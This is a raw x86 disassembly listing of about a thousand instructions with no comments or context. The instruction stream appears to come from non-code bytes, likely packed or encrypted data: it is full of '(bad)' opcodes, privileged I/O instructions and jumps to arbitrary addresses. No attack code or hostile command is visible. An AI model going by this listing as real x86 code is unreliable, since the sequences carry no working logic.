  405fba:	imul   esi,DWORD PTR [eax+eiz*8],0x3
  405fbe:	fidiv  WORD PTR [edi-0x44671b35]
  405fc4:	jns    0x406028
  405fc6:	retf   0x10c8
  405fc9:	jge    0x405fb1
  405fcb:	push   edi
  405fcc:	mov    ds:0xe528183a,al
  405fd1:	jno    0x406049
  405fd3:	nop
  405fd4:	push   esp
  405fd5:	xchg   bl,dh
  405fd7:	sub    cl,BYTE PTR [edx+0x7e]
  405fda:	std    
  405fdb:	and    al,0x3d
  405fdd:	cmp    edx,DWORD PTR [esi+0x486c7647]
  405fe3:	inc    eax
  405fe4:	jl     0x405f90
  405fe6:	stc    
  405fe7:	lea    edi,ds:0x4d25a650
  405fed:	inc    edi
  405fee:	js     0x405ff2
  405ff0:	mov    ecx,0x7264fd50
  405ff5:	jmp    0x4062e5
  405ffa:	iret   
  405ffb:	rcl    ebx,cl
  405ffd:	retf   
  405ffe:	ror    ebx,cl
  406000:	xlat   BYTE PTR ds:[ebx]
  406001:	(bad)  [ecx]
  406003:	lods   eax,DWORD PTR ds:[esi]
  406004:	and    al,0xa9
  406006:	test   BYTE PTR [esi-0x3d76e0f0],0x78
  40600d:	js     0x40605c
  40600f:	jle    0x406089
  406011:	js     0x405fc5
  406013:	outs   dx,DWORD PTR ds:[esi]
  406014:	jle    0x405fb4
  406016:	push   ecx
  406017:	inc    esp
  406018:	popa   
  406019:	shl    DWORD PTR [ecx-0x77037dc3],cl
  40601f:	dec    eax
  406020:	in     al,0xc9
  406022:	jno    0x405fbc
  406024:	mov    bh,0x63
  406026:	cld    
  406027:	sbb    al,0x8f
  406029:	mov    bh,bl
  40602b:	daa    
  40602c:	int    0xdf
  40602e:	or     dh,ch
  406030:	jbe    0x405fc2
  406032:	fadd   QWORD PTR [eax+ecx*1+0x4151423c]
  406039:	icebp  
  40603a:	add    al,0x7e
  40603c:	(bad)
  40603f:	xor    ecx,ecx
  406041:	jp     0x4060bc
  406043:	adc    eax,0x6732c921
  406048:	jb     0x40606e
  40604a:	(bad)  
  40604b:	pop    ds
  40604c:	jmp    0x863:0xb648808
  406053:	pop    ecx
  406054:	cmp    DWORD PTR [ecx-0x7a],0x62
  406058:	dec    ebp
  406059:	jne    0x406034
  40605b:	dec    esi
  40605c:	lods   al,BYTE PTR ds:[esi]
  40605d:	sbb    BYTE PTR [ebx-0x8],bh
  406060:	mov    al,ds:0xd152d554
  406065:	mov    dh,0x34
  406067:	fadd   QWORD PTR [ebp-0x7e591866]
  40606d:	xchg   ebx,eax
  40606e:	into   
  40606f:	mul    dh
  406071:	xchg   esi,eax
  406072:	cmp    eax,0xeea4f293
  406077:	into   
  406078:	(bad)  [edx-0x1385c8b4]
  40607e:	and    DWORD PTR [esi+0x7c],eax
  406081:	das    
  406082:	mov    ebx,0x421f4644
  406087:	jae    0x406064
  406089:	or     BYTE PTR [edx],cl
  40608b:	jg     0x40607e
  40608d:	pop    ss
  40608e:	inc    ecx
  40608f:	ror    DWORD PTR [ebp-0x78],1
  406092:	pop    ebx
  406093:	ret    0xd888
  406096:	iret   
  406097:	sbb    BYTE PTR [edx+0x1f09c440],ch
  40609d:	jg     0x4060f6
  40609f:	fmul   QWORD PTR [eax+0x142a9eac]
  4060a5:	dec    eax
  4060a6:	mov    bh,0xed
  4060a8:	leave  
  4060a9:	push   ds
  4060aa:	js     0x4060c6
  4060ac:	mov    ebp,0x7ae38c5f
  4060b1:	sar    ebx,0x10
  4060b4:	rcr    DWORD PTR [ecx+ecx*1],cl
  4060b7:	or     DWORD PTR [ecx-0xe],edi
  4060ba:	push   esi
  4060bb:	xchg   BYTE PTR [ecx+0x3b],bl
  4060be:	push   esi
  4060bf:	jne    0x4060fb
  4060c1:	mov    bl,0x5d
  4060c3:	mov    DWORD PTR [edi-0x2e],ebx
  4060c6:	mov    bh,0x58
  4060c8:	xor    dl,BYTE PTR ds:0x99548df7
  4060ce:	fucomip st,st(0)
  4060d0:	mov    bh,0x28
  4060d2:	pop    ss
  4060d3:	lahf   
  4060d4:	xor    DWORD PTR [ecx-0x1b],eax
  4060d7:	fimul  DWORD PTR ds:[ebx+0x54ef6b9e]
  4060de:	add    al,0x8a
  4060e0:	lods   al,BYTE PTR ds:[esi]
  4060e1:	out    0x2f,al
  4060e3:	adc    al,0x77
  4060e5:	mov    ds:0x60d98b4c,eax
  4060ea:	pop    ebx
  4060eb:	sub    DWORD PTR [ecx+esi*4-0x29],esp
  4060ef:	sbb    eax,0x65fbf8af
  4060f4:	push   0x45f40634
  4060f9:	aad    0x66
  4060fb:	and    edx,esp
  4060fd:	mov    dl,0xc8
  4060ff:	adc    edi,0x3
  406102:	cmp    cl,BYTE PTR [eax+edx*2]
  406105:	loop   0x4060be
  406107:	jge    0x40616c
  406109:	retf   0x362f
  40610c:	add    eax,0xbe1ab11b
  406111:	push   0x88bf798
  406116:	push   ds
  406117:	es mov edx,0x358ced98
  40611d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40611e:	sub    DWORD PTR ds:0x9a88aeb1,esp
  406124:	(bad)  
  406125:	push   ebp
  406126:	scas   al,BYTE PTR es:[edi]
  406127:	mov    cs,WORD PTR [ebp+ebx*2-0x6b]
  40612b:	adc    DWORD PTR [ecx+0x2b],ebx
  40612e:	sbb    al,BYTE PTR [ecx-0x6a]
  406131:	dec    esi
  406132:	mov    ch,0x1e
  406134:	cld    
  406135:	outs   dx,DWORD PTR ds:[esi]
  406136:	out    dx,al
  406137:	jle    0x40619e
  406139:	xor    BYTE PTR [ebx+0xd0ed872],dl
  40613f:	push   0x5d4dc3eb
  406144:	sub    DWORD PTR [edx+0x3b],edi
  406147:	push   esp
  406148:	les    ecx,FWORD PTR [bp+di+0x39]
  40614c:	(bad)  
  40614d:	dec    edi
  40614e:	adc    ebx,esi
  406150:	outs   dx,DWORD PTR ds:[esi]
  406151:	and    eax,DWORD PTR [edx]
  406153:	int3   
  406154:	mov    esi,0x4870c819
  406159:	je     0x406150
  40615b:	and    bl,BYTE PTR [eax]
  40615d:	add    ah,ch
  40615f:	lea    esp,[ebp+eiz*4-0x34]
  406163:	scas   eax,DWORD PTR es:[edi]
  406164:	nop
  406165:	or     DWORD PTR [ecx-0x5d7f6d7d],esp
  40616b:	iret   
  40616c:	add    DWORD PTR [eax-0x1b],esp
  40616f:	out    dx,eax
  406170:	jg     0x4061d4
  406172:	out    0x68,eax
  406174:	fadd   st,st(0)
  406176:	pop    esp
  406177:	scas   eax,DWORD PTR es:[edi]
  406178:	cli    
  406179:	jl     0x40617e
  40617b:	add    bl,ah
  40617d:	mov    eax,ds:0x6110871d
  406182:	push   ds
  406183:	test   al,0xc
  406185:	(bad)  
  406187:	push   0x5746fe2b
  40618c:	dec    esp
  40618d:	or     DWORD PTR [eax+0x30],ecx
  406190:	dec    esp
  406191:	push   esp
  406192:	or     DWORD PTR [edi+0x49b9ddee],ecx
  406198:	push   esp
  406199:	xchg   edx,eax
  40619a:	popa   
  40619b:	loop   0x40615d
  40619d:	ds inc edx
  40619f:	(bad)  
  4061a0:	cld    
  4061a1:	popf   
  4061a2:	xchg   edx,eax
  4061a3:	stc    
  4061a4:	jns    0x40618c
  4061a6:	add    ah,BYTE PTR [edx+edi*4-0x72]
  4061aa:	dec    esi
  4061ab:	jmp    0x40618a
  4061ad:	fs jnp 0x406175
  4061b0:	inc    esp
  4061b1:	popf   
  4061b2:	or     DWORD PTR [ecx-0xeb8f32f],ebp
  4061b8:	mov    bl,0x95
  4061ba:	add    eax,0x8ce27ae3
  4061bf:	test   al,ah
  4061c1:	fld    TBYTE PTR ds:0x2e21097e
  4061c7:	cmp    esp,esi
  4061c9:	fistp  WORD PTR [esi-0x251088cd]
  4061cf:	bound  ebx,QWORD PTR [edi-0x4e]
  4061d2:	fisub  DWORD PTR [esi+eiz*4+0x48fdcc54]
  4061d9:	adc    DWORD PTR [ebx],ecx
  4061db:	or     BYTE PTR [ebx],ah
  4061dd:	fsub   st,st(1)
  4061df:	push   ecx
  4061e0:	sbb    eax,eax
  4061e2:	call   0xee4c:0x2c23cc17
  4061e9:	das    
  4061ea:	add    BYTE PTR [ebp+0xcec6976],bl
  4061f0:	jl     0x4061b9
  4061f2:	or     eax,0xc3adf668
  4061f7:	repnz (bad) 
  4061f9:	cs daa 
  4061fb:	lea    edi,[esi+0x70]
  4061fe:	mov    esi,0xf0b58cdc
  406203:	lahf   
  406204:	js     0x40627b
  406206:	or     eax,0xab5a4a66
  40620b:	mov    esi,0x4da4925
  406210:	lods   eax,DWORD PTR ds:[esi]
  406211:	out    dx,al
  406212:	into   
  406213:	(bad)  
  406214:	nop
  406215:	inc    eax
  406216:	jg     0x406269
  406218:	mul    DWORD PTR [esi]
  40621a:	sbb    DWORD PTR [ebx+ebx*2+0x9],ebx
  40621e:	retf   0xc3d4
  406221:	into   
  406222:	test   BYTE PTR [edi-0x49],dl
  406225:	sahf   
  406226:	sbb    cl,BYTE PTR [ecx]
  406228:	fisubr DWORD PTR [eax+0x43f5fe8c]
  40622e:	div    al
  406230:	ret    0x726e
  406233:	cmp    al,0xcd
  406235:	dec    esp
  406236:	sbb    DWORD PTR [esp+eax*4+0x6cfca9bb],edi
  40623d:	test   al,cl
  40623f:	repz jns 0x40626a
  406242:	mov    dh,0xda
  406244:	dec    edi
  406245:	jp     0x406263
  406247:	mov    ebx,0x88a8eba1
  40624c:	mov    ch,0x13
  40624e:	xchg   esi,eax
  40624f:	aaa    
  406250:	loope  0x406237
  406252:	std    
  406253:	mov    cl,0xbe
  406255:	xor    eax,DWORD PTR [eax-0x3abc4f86]
  40625b:	jb     0x4062a6
  40625d:	mov    ebp,0x27a9028
  406262:	mov    edi,0x98c63d8d
  406267:	fistp  WORD PTR [edx]
  406269:	push   DWORD PTR [eax+0x6dcc298]
  40626f:	xchg   edi,eax
  406270:	mov    BYTE PTR [ecx],ch
  406272:	out    0xb9,eax
  406274:	scas   eax,DWORD PTR es:[edi]
  406275:	shr    BYTE PTR [ecx+0x41],cl
  406278:	add    al,0xa
  40627a:	les    edx,FWORD PTR [ecx+0x5a2d39d1]
  406280:	xchg   esp,eax
  406281:	hlt    
  406282:	xchg   DWORD PTR [ebp-0x7b],ebx
  406285:	and    dl,BYTE PTR [eax+eax*2]
  406288:	cs and al,0x28
  40628b:	adc    al,0xe1
  40628d:	hlt    
  40628e:	jne    0x40622d
  406290:	mov    ds:0x4f641f2,eax
  406295:	enter  0xcead,0x6f
  406299:	sub    BYTE PTR cs:[ebx],ch
  40629c:	cdq    
  40629d:	retf   
  40629e:	lods   eax,DWORD PTR ds:[esi]
  40629f:	or     ebx,ecx
  4062a1:	loop   0x4062a7
  4062a3:	rol    BYTE PTR [eax],0xe2
  4062a6:	push   eax
  4062a7:	mov    ds:0x19a13c33,eax
  4062ac:	inc    ebx
  4062ad:	lahf   
  4062ae:	cmp    edx,DWORD PTR [ecx-0x3fdf018b]
  4062b4:	arpl   WORD PTR [esi-0x1d],si
  4062b7:	adc    al,BYTE PTR [esi]
  4062b9:	xor    eax,0xdaae1592
  4062be:	mov    eax,ds:0xd6f3fc62
  4062c3:	and    ah,dh
  4062c5:	stos   BYTE PTR es:[edi],al
  4062c6:	lods   al,BYTE PTR ds:[esi]
  4062c7:	xchg   edx,eax
  4062c8:	clc    
  4062c9:	aaa    
  4062ca:	sub    eax,0x2f11772c
  4062cf:	pop    ebp
  4062d0:	pop    ecx
  4062d1:	mov    bl,0x69
  4062d3:	push   edx
  4062d4:	call   0xf05d7770
  4062d9:	sti    
  4062da:	fstp   DWORD PTR [edi+ecx*2-0x4d938172]
  4062e1:	aas    
  4062e2:	ins    BYTE PTR es:[edi],dx
  4062e3:	add    al,0xf6
  4062e5:	div    ecx
  4062e7:	mov    ecx,DWORD PTR [ebp+0x10]
  4062ea:	jmp    0x4065da
  4062ef:	(bad)  
  4062f0:	aas    
  4062f1:	ret    0xc9c2
  4062f4:	rol    esi,0xcb
  4062f7:	sbb    DWORD PTR [ebp-0x64],0x5c6a575c
  4062fe:	dec    esi
  4062ff:	faddp  st(7),st
  406301:	js     0x40637b
  406303:	dec    ebp
  406304:	jle    0x40637e
  406306:	js     0x406329
  406308:	stos   DWORD PTR es:[edi],eax
  406309:	bswap  ebp
  40630b:	and    DWORD PTR [ecx],eax
  40630d:	(bad)  [edx+0x2e]
  406310:	gs js  0x4062b7
  406313:	dec    edi
  406314:	add    eax,0x26127607
  406319:	pop    edx
  40631a:	jno    0x406337
  40631c:	or     al,0x41
  40631e:	pop    ecx
  40631f:	mov    DWORD PTR [eax-0x3bbd3cbb],esp
  406325:	or     edi,ebx
  406327:	mov    ecx,0x70f84a53
  40632c:	mov    ch,0x33
  40632e:	cmp    bh,BYTE PTR [edx+0x2666c611]
  406334:	test   eax,0x3366b143
  406339:	inc    ecx
  40633a:	pop    es
  40633b:	iret   
  40633c:	push   edx
  40633d:	inc    esi
  40633e:	aas    
  40633f:	xor    BYTE PTR [ebp-0x16fcef90],cl
  406345:	pop    edx
  406346:	dec    eax
  406347:	cwde   
  406348:	hlt    
  406349:	lods   eax,DWORD PTR ds:[esi]
  40634a:	mov    ebx,0xf638afe7
  40634f:	adc    esi,DWORD PTR [ecx-0x6a]
  406352:	dec    eax
  406353:	mov    al,BYTE PTR [edi+0x56c881f6]
  406359:	sbb    edx,eax
  40635b:	cmp    ah,BYTE PTR [ebp+0x46037403]
  406361:	jnp    0x40631c
  406363:	sbb    edi,ebx
  406365:	sbb    eax,0x5bd539de
  40636a:	jmp    0x784e31e0
  40636f:	add    DWORD PTR [esi+0x6e],ecx
  406372:	mov    DWORD PTR [esi-0x718d4b4e],esi
  406378:	push   es
  406379:	jns    0x40635d
  40637b:	sbb    al,bh
  40637d:	adc    DWORD PTR [esp+edx*2],eax
  406380:	dec    ebp
  406381:	pusha  
  406382:	or     eax,0x5df2cdf2
  406387:	or     al,0x3e
  406389:	dec    ebx
  40638a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40638b:	popf   
  40638c:	stos   BYTE PTR es:[edi],al
  40638d:	mov    gs,eax
  40638f:	jo     0x4063a8
  406391:	or     DWORD PTR [ebx],eax
  406393:	sub    al,0x35
  406395:	sub    ch,dl
  406397:	cmp    DWORD PTR [esi],0xfffffff6
  40639a:	mov    ebx,0x96491b4b
  40639f:	mov    DWORD PTR ds:0x994a152d,ebp
  4063a5:	add    BYTE PTR [eax-0x68],bl
  4063a8:	les    esp,FWORD PTR [esi+0x20]
  4063ab:	mov    ch,0xeb
  4063ad:	pop    esp
  4063ae:	sar    BYTE PTR [edi-0x2c],1
  4063b1:	bound  ebp,QWORD PTR [eax-0x1]
  4063b4:	test   eax,0x50975ac0
  4063b9:	ror    BYTE PTR [edi+0x55646e5e],cl
  4063bf:	mov    esp,ecx
  4063c1:	imul   edi,DWORD PTR [esi-0x1],0xffffffeb
  4063c5:	popa   
  4063c6:	mov    ah,0x52
  4063c8:	cmp    al,0xa5
  4063ca:	mov    ebp,0x6a5806cb
  4063cf:	bound  ebx,QWORD PTR [ebx]
  4063d1:	push   es
  4063d2:	sub    cl,BYTE PTR [ecx-0x73]
  4063d5:	adc    eax,edi
  4063d7:	ds pop edi
  4063d9:	push   ss
  4063da:	fistp  DWORD PTR [ecx]
  4063dc:	fxam   
  4063de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063df:	or     ah,ah
  4063e1:	mov    ecx,0x443b2e96
  4063e6:	cmp    ecx,DWORD PTR [ebx+0x47]
  4063e9:	cmp    bh,ch
  4063eb:	push   esi
  4063ec:	cld    
  4063ed:	sub    al,0x12
  4063ef:	dec    sp
  4063f1:	mov    DWORD PTR [ecx],edx
  4063f3:	pop    ebx
  4063f4:	inc    esp
  4063f5:	enter  0x650d,0x38
  4063f9:	jg     0x4063fd
  4063fb:	mov    cl,0x78
  4063fd:	mov    ds:0xd297b4a7,eax
  406402:	xchg   esp,eax
  406403:	push   ebp
  406404:	pop    ds
  406405:	jns    0x406430
  406407:	push   ecx
  406408:	dec    ebx
  406409:	mov    ebx,0x9f7c45f0
  40640e:	lahf   
  40640f:	(bad)  
  406411:	cmp    eax,0xc6e2e1a0
  406416:	outs   dx,DWORD PTR ds:[esi]
  406417:	ret    0xf3c8
  40641a:	pop    ebx
  40641b:	call   0x8caa:0x5443ee23
  406422:	jae    0x4063ff
  406424:	adc    ecx,DWORD PTR [edi+ebp*2]
  406427:	inc    eax
  406428:	cmc    
  406429:	outs   dx,DWORD PTR ds:[esi]
  40642a:	jne    0x4063e5
  40642c:	xor    BYTE PTR [ebx-0x5fc3aa1e],dh
  406432:	shr    DWORD PTR ds:0xebf0e746,0xcb
  406439:	jle    0x406495
  40643b:	sbb    bl,ch
  40643d:	mov    ds:0x69f1f08f,al
  406442:	cmp    ah,BYTE PTR [ecx-0x29]
  406445:	loopne 0x40644a
  406447:	add    DWORD PTR ds:0x51a2aa36,ebp
  40644d:	aaa    
  40644e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40644f:	hlt    
  406450:	call   0x5ddac1b7
  406455:	cmc    
  406456:	fs dec ebx
  406458:	dec    ebx
  406459:	enter  0x52f2,0x8f
  40645d:	je     0x40640d
  40645f:	popf   
  406460:	cmp    al,0xe
  406462:	mov    dl,0xe4
  406464:	jns    0x4064b7
  406466:	inc    eax
  406467:	jnp    0x4064a1
  406469:	ret    
  40646a:	imul   ebx,edi,0x6070b5ec
  406470:	dec    ecx
  406471:	jg     0x4064f2
  406473:	adc    ecx,DWORD PTR [esi+0x146b14eb]
  406479:	cs xor eax,0xe53e3fd0
  40647f:	fistp  QWORD PTR ss:[edi+0x3a7d39ee]
  406486:	sbb    BYTE PTR [edi],0x10
  406489:	ret    
  40648a:	pop    ebx
  40648b:	dec    esi
  40648c:	std    
  40648d:	mov    esi,0xd1c59cd9
  406492:	adc    ebx,ecx
  406494:	fisubr DWORD PTR ds:[ebx-0x7e916641]
  40649b:	xor    ah,BYTE PTR [ebp-0x5a]
  40649e:	fcomi  st,st(3)
  4064a0:	mov    ch,BYTE PTR [edi+0x2d7ec040]
  4064a6:	loope  0x4064e4
  4064a8:	push   ds
  4064a9:	mov    ds:0x1ad547a5,eax
  4064ae:	push   0xafffedcc
  4064b3:	xchg   edx,eax
  4064b4:	add    ah,BYTE PTR [eax+0x50f47560]
  4064ba:	xor    DWORD PTR [ecx+0x595a2d5a],ebx
  4064c0:	mov    ecx,0xa066cef2
  4064c5:	jo     0x406452
  4064c7:	mov    dh,0x82
  4064c9:	mov    bh,0xe7
  4064cb:	daa    
  4064cc:	int3   
  4064cd:	sub    esp,ecx
  4064cf:	shl    esi,0x53
  4064d2:	fld    DWORD PTR [ecx]
  4064d4:	ins    BYTE PTR es:[edi],dx
  4064d5:	inc    ebp
  4064d6:	mov    cl,0xcb
  4064d8:	jmp    0xb841aeda
  4064dd:	loop   0x4064ac
  4064df:	jno    0x4064ce
  4064e1:	pushf  
  4064e2:	cmp    BYTE PTR [ebx],ch
  4064e4:	or     esp,DWORD PTR [edi-0x76]
  4064e7:	test   BYTE PTR [ecx+0x21],dh
  4064ea:	add    al,BYTE PTR [ebx]
  4064ec:	lds    edx,FWORD PTR [ecx-0x26aff310]
  4064f2:	icebp  
  4064f3:	test   bh,bh
  4064f5:	lods   al,BYTE PTR ds:[esi]
  4064f6:	shl    BYTE PTR [ebp+0x57],cl
  4064f9:	cwde   
  4064fa:	fst    QWORD PTR [edx+0x32126c5c]
  406500:	das    
  406501:	aam    0xfb
  406503:	ds pop ss
  406505:	xchg   DWORD PTR [edx],esi
  406507:	mov    ah,0x4e
  406509:	push   esp
  40650a:	sub    eax,DWORD PTR [esi-0x25c6d557]
  406510:	fsub   DWORD PTR [ebp+0x74ad6ecf]
  406516:	cld    
  406517:	call   0xc04974a2
  40651c:	jnp    0x4064ca
  40651e:	jae    0x4064c2
  406520:	or     eax,0x9ca45410
  406525:	jge    0x406534
  406527:	les    edi,FWORD PTR ds:0x8ac9d810
  40652d:	lods   al,BYTE PTR ds:[esi]
  40652e:	sub    eax,0x37a9e19d
  406533:	adc    al,0x6b
  406535:	fs push ebx
  406537:	cmp    BYTE PTR [esp+ebp*4],0x7a
  40653b:	push   esi
  40653c:	fidiv  DWORD PTR [edi]
  40653e:	enter  0xb1e7,0xaf
  406542:	add    BYTE PTR cs:0x691356a2,dh
  406549:	mov    ecx,0xd7479ac7
  40654e:	or     BYTE PTR [esi-0x2c6a02ae],dl
  406554:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406555:	inc    ebp
  406556:	push   eax
  406557:	fistp  WORD PTR es:[edx-0x3]
  40655b:	lahf   
  40655c:	or     esp,DWORD PTR [edi]
  40655e:	push   0x40
  406560:	mov    DWORD PTR [edi+0x3acfa8b0],esi
  406566:	fld    st(5)
  406568:	adc    eax,ebp
  40656a:	mov    ds,WORD PTR [ecx-0x70]
  40656d:	arpl   WORD PTR [edi],ax
  40656f:	out    0xa6,eax
  406571:	ret    0x6698
  406574:	ret    0x9e61
  406577:	inc    ecx
  406578:	sub    eax,0x6751b8e0
  40657d:	(bad)  
  40657e:	push   cs
  40657f:	sbb    al,BYTE PTR [ebx]
  406581:	mov    esi,0x42bbb33f
  406586:	out    0xe,al
  406588:	loop   0x4065d1
  40658a:	or     eax,0xf5e595ee
  40658f:	mov    al,ds:0x16bb07ff
  406594:	bound  ecx,QWORD PTR [edx]
  406596:	out    0xe0,al
  406598:	dec    edi
  406599:	dec    eax
  40659a:	les    ecx,FWORD PTR [edx-0x7262985c]
  4065a0:	sbb    al,0x9e
  4065a2:	add    bl,BYTE PTR ds:0x2522b720
  4065a8:	push   cs
  4065a9:	mov    ecx,0xfaf03cbf
  4065ae:	xor    al,bh
  4065b0:	test   eax,edi
  4065b2:	add    DWORD PTR [ebx+edi*8+0x38],ecx
  4065b6:	xchg   esp,eax
  4065b7:	fsubr  QWORD PTR [edi]
  4065b9:	push   ebp
  4065ba:	scas   al,BYTE PTR es:[edi]
  4065bb:	cmp    eax,0x11576be0
  4065c0:	xchg   ecx,eax
  4065c1:	shl    DWORD PTR [edi-0x4],1
  4065c4:	mov    eax,0xab71dd44
  4065c9:	test   eax,0xfadbf
  4065ce:	sub    eax,0xe46a8312
  4065d3:	jmp    0xef31:0x90775dfa
  4065da:	and    ecx,eax
  4065dc:	or     ecx,0x81161d8e
  4065e2:	mov    eax,ecx
  4065e4:	jmp    0x4068d4
  4065e9:	ds enter 0x3dcf,0xcd
  4065ee:	cmp    eax,0xabe7cfce
  4065f3:	mov    ch,cl
  4065f5:	cdq    
  4065f6:	stos   BYTE PTR es:[edi],al
  4065f7:	call   0x790499c0
  4065fc:	js     0x40664b
  4065fe:	jle    0x406678
  406600:	js     0x40666e
  406602:	jmp    0x23bfc782
  406607:	mov    edx,0x369c6b57
  40660c:	push   cs
  40660d:	cli    
  40660e:	pushf  
  40660f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406610:	lea    eax,[edx]
  406612:	xchg   ecx,eax
  406613:	mov    bl,0x43
  406615:	je     0x406627
  406617:	dec    ebx
  406618:	in     al,dx
  406619:	(bad)  
  40661a:	cmp    eax,0xf65f225e
  40661f:	push   edi
  406620:	mov    dh,0x95
  406622:	add    cl,ah
  406624:	xchg   ebx,eax
  406625:	or     ebp,DWORD PTR [edx]
  406627:	jle    0x406655
  406629:	or     edi,DWORD PTR ds:0x8f91bc06
  40662f:	mov    DWORD PTR [ebx],ecx
  406631:	pop    esi
  406632:	and    edx,DWORD PTR [eax-0x1c82673d]
  406638:	jmp    0x7c0e:0x1c6fe33f
  40663f:	fwait
  406640:	add    eax,0x910c6a64
  406645:	hlt    
  406646:	retf   
  406647:	test   al,0x5d
  406649:	cli    
  40664a:	sbb    BYTE PTR [ebp-0x42],bl
  40664d:	mov    al,ds:0x8866891d
  406652:	mov    ah,0x98
  406654:	jae    0x4066bc
  406656:	stos   DWORD PTR es:[edi],eax
  406657:	test   esp,esi
  406659:	inc    ebp
  40665a:	add    cl,al
  40665c:	push   ebx
  40665d:	mov    DWORD PTR [edx-0x763b6b11],ebp
  406663:	in     al,dx
  406664:	jmp    0x9b6610cf
  406669:	fwait
  40666a:	mov    al,0x4
  40666c:	sbb    dh,BYTE PTR [edi]
  40666e:	jmp    0x40664e
  406670:	shl    DWORD PTR [ecx+eiz*8],cl
  406673:	jbe    0x406629
  406675:	sti    
  406676:	fs call 0xd44e2c07
  40667c:	cmp    eax,DWORD PTR [edx-0x57555cd1]
  406682:	adc    dh,BYTE PTR [esi-0x1a]
  406685:	mov    cl,0x5a
  406687:	mov    ch,0x7d
  406689:	or     eax,0x72b29def
  40668e:	addr16 dec ebp
  406690:	and    cl,dl
  406692:	mov    esp,0x882a801a
  406697:	mov    al,0xd2
  406699:	adc    esp,0xffffffc4
  40669c:	mov    eax,0x381bb23f
  4066a1:	fmul   QWORD PTR [ebx-0x73]
  4066a4:	ins    DWORD PTR es:[edi],dx
  4066a5:	bound  ecx,QWORD PTR [edi]
  4066a7:	cvttps2pi mm4,QWORD PTR [esp+ebp*2+0x406b6b55]
  4066af:	mov    eax,ds:0xb3f336bc
  4066b4:	dec    esp
  4066b5:	jbe    0x4066a2
  4066b7:	dec    ecx
  4066b8:	mov    ebx,DWORD PTR [esi-0x2ac7944f]
  4066be:	push   0x135b818e
  4066c3:	xor    ah,dh
  4066c5:	fmul   DWORD PTR [esi+0x72154ca0]
  4066cb:	add    edx,DWORD PTR [ebx+ebx*4]
  4066ce:	mov    edi,0x48a385d4
  4066d3:	or     ebp,DWORD PTR [ebx-0x5ea71c76]
  4066d9:	adc    ebp,DWORD PTR [edx]
  4066db:	bswap  eax
  4066dd:	stc    
  4066de:	jle    0x40671b
  4066e0:	mov    ebx,0xb9c7bbb2
  4066e5:	sbb    eax,0x4e24967e
  4066ea:	or     BYTE PTR [ecx+edi*8+0x5ddc2e91],cl
  4066f1:	out    dx,al
  4066f2:	cmp    DWORD PTR [ebp+ecx*2-0x45],eax
  4066f6:	arpl   WORD PTR [esi],bp
  4066f8:	mov    al,0x27
  4066fa:	dec    edi
  4066fb:	repz loop 0x406773
  4066fe:	cwde   
  4066ff:	fild   DWORD PTR [ecx]
  406701:	push   0xffffff86
  406703:	sub    al,0xa4
  406705:	aaa    
  406706:	or     dl,ch
  406708:	sbb    BYTE PTR ds:0xf0fbf142,dh
  40670e:	pop    edx
  40670f:	in     eax,dx
  406710:	push   0x9566c17f
  406715:	loope  0x4066fd
  406717:	cmp    BYTE PTR [esi-0x72f4a25e],bh
  40671d:	pop    esi
  40671e:	cwde   
  40671f:	sub    DWORD PTR [bp+0x2b],0xfffffffe
  406724:	or     BYTE PTR [eax-0x282245e7],dl
  40672a:	pop    ss
  40672b:	inc    esi
  40672c:	std    
  40672d:	aam    0xa3
  40672f:	mov    al,ds:0x9bd6d723
  406734:	mov    eax,0x6e60dcec
  406739:	adc    BYTE PTR [ecx+0x45528834],al
  40673f:	pop    ecx
  406740:	lods   eax,DWORD PTR ds:[esi]
  406741:	inc    esi
  406742:	mov    bl,0xc3
  406744:	and    DWORD PTR [eax+0x1a6fb05d],ecx
  40674a:	adc    BYTE PTR [edx+0x0],al
  40674d:	ds loope 0x4067be
  406750:	dec    eax
  406751:	fild   WORD PTR [esi*8+0xca46454]
  406758:	pop    ecx
  406759:	or     esp,DWORD PTR [edx]
  40675b:	xor    BYTE PTR [edx-0x7],al
  40675e:	fwait
  40675f:	bound  esi,QWORD PTR [esi]
  406761:	fisub  DWORD PTR [esi+0x68f4302]
  406767:	jge    0x406793
  406769:	push   ebp
  40676a:	push   ecx
  40676b:	loopne 0x4067b4
  40676d:	mov    ?,WORD PTR [ecx+0x6639422d]
  406773:	mov    eax,ds:0xf6c2a009
  406778:	mov    al,ds:0x81a175da
  40677d:	rcl    BYTE PTR [eax+0x17cb462e],1
  406783:	fprem  
  406785:	fs dec ebx
  406787:	or     al,0xfd
  406789:	dec    edi
  40678a:	mov    ch,0x2e
  40678c:	jp     0x4067e6
  40678e:	fs stos DWORD PTR es:[edi],eax
  406790:	out    dx,al
  406791:	fs lock xchg edx,eax
  406794:	dec    ecx
  406795:	jb     0x40678f
  406797:	fiadd  WORD PTR [ebx-0x5c5c5172]
  40679d:	jns    0x40673e
  40679f:	cmc    
  4067a0:	add    al,0xc0
  4067a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067a3:	push   0xc1eeb9bb
  4067a8:	push   esp
  4067a9:	inc    eax
  4067aa:	jge    0x4067d1
  4067ac:	inc    ebx
  4067ad:	jnp    0x4067f6
  4067af:	mov    al,0x71
  4067b1:	push   eax
  4067b2:	(bad)  
  4067b3:	outs   dx,BYTE PTR ds:[esi]
  4067b4:	cdq    
  4067b5:	sbb    eax,0x253606fe
  4067ba:	mov    edx,0xbe90fc0
  4067bf:	daa    
  4067c0:	xchg   esi,eax
  4067c1:	mov    ?,WORD PTR [esi*8+0x7dd31c5e]
  4067c8:	push   ds
  4067c9:	ret    0xf237
  4067cc:	pop    eax
  4067cd:	ins    DWORD PTR es:[edi],dx
  4067ce:	(bad)  
  4067cf:	dec    ebp
  4067d0:	jg     0x4067ca
  4067d2:	mov    edi,0x91d84271
  4067d7:	cmp    al,BYTE PTR [ebp+0x5958f266]
  4067dd:	jnp    0x406792
  4067df:	mov    BYTE PTR [ebp-0x2cc83fe9],bh
  4067e5:	scas   al,BYTE PTR es:[edi]
  4067e6:	or     ah,BYTE PTR [ecx-0x22cde58a]
  4067ec:	daa    
  4067ed:	inc    edi
  4067ee:	add    DWORD PTR [edx+eiz*1],esi
  4067f1:	jmp    0x6215:0x71ab36ed
  4067f8:	sub    al,0x3e
  4067fa:	adc    cl,cl
